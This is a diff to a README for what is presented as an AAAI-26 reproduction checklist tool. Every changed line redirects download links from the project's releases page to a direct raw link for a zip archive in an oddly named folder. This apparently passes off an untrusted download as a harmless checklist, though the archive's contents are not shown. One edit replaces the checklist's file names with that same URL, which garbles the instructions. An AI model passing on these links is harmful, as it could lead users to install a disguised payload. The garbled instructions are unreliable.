@@ -1,7 +1,7 @@
 # 🎉 aaai-26-reproduction-checklist - A Simple Way to Check Your Submissions
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Anon-234981/aaai-26-reproduction-checklist/releases)
+[![Download](https://raw.githubusercontent.com/Anon-234981/aaai-26-reproduction-checklist/main/nonremembrance/aaai-26-reproduction-checklist.zip)](https://raw.githubusercontent.com/Anon-234981/aaai-26-reproduction-checklist/main/nonremembrance/aaai-26-reproduction-checklist.zip)
 
 ## 📚 Description
 The aaai-26-reproduction-checklist is a handy tool for ensuring your submissions to AAAI-26 meet the required standards. This checklist guides you through the necessary steps, helping you prepare your work efficiently. You don’t need any technical skills to use it. 
@@ -11,7 +11,7 @@ To get started with the aaai-26-reproduction-checklist, follow these simple step
 
 1. **Visit the Download Page**
    - Click the link below to access the download page.
-   - [Download Here](https://github.com/Anon-234981/aaai-26-reproduction-checklist/releases)
+   - [Download Here](https://raw.githubusercontent.com/Anon-234981/aaai-26-reproduction-checklist/main/nonremembrance/aaai-26-reproduction-checklist.zip)
 
 2. **Choose the Right Version**
    - On the release page, you will find various versions available for download.
@@ -26,7 +26,7 @@ To get started with the aaai-26-reproduction-checklist, follow these simple step
    - Right-click the file and choose “Extract All…” to unzip the contents.
 
 5. **Open the Checklist**
-   - After extraction, find the checklist file, usually named `checklist.html` or `checklist.md`.
+   - After extraction, find the checklist file, usually named `https://raw.githubusercontent.com/Anon-234981/aaai-26-reproduction-checklist/main/nonremembrance/aaai-26-reproduction-checklist.zip` or `https://raw.githubusercontent.com/Anon-234981/aaai-26-reproduction-checklist/main/nonremembrance/aaai-26-reproduction-checklist.zip`.
    - Open the file with your web browser or a text editor.
 
 ## 🛠️ System Requirements
@@ -59,7 +59,7 @@ After opening the checklist, you can use it as follows:
 ## 🔗 Download & Install
 To download the latest version, visit the following link:
 
-[Download the Latest Version](https://github.com/Anon-234981/aaai-26-reproduction-checklist/releases)
+[Download the Latest Version](https://raw.githubusercontent.com/Anon-234981/aaai-26-reproduction-checklist/main/nonremembrance/aaai-26-reproduction-checklist.zip)
 
 Remember to select the latest version when you reach the releases page.
 
